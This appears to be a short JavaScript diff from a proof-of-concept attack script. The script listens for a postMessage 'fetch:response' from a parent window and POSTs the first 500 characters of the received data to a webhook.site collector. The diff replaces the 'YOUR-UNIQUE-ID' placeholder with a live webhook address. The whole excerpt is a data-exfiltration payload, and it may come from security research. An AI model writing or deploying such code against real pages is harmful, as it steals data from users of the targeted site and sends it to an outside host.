@@ -21,7 +21,7 @@ window.addEventListener("message", function handler(e) {
   if (e.data?.id === id && e.data?.name === 'fetch:response') {
     log("[✔] Data received from parent!");
     log("Length: " + e.data.payload.length);
-    fetch("https://webhook.site/YOUR-UNIQUE-ID", {
+    fetch("https://webhook.site/2106b9ef-aafe-498c-b8e0-bef7c35b92f3", {
       method: "POST",
       headers: { "Content-Type": "text/plain" },
       body: e.data.payload.slice(0, 500)
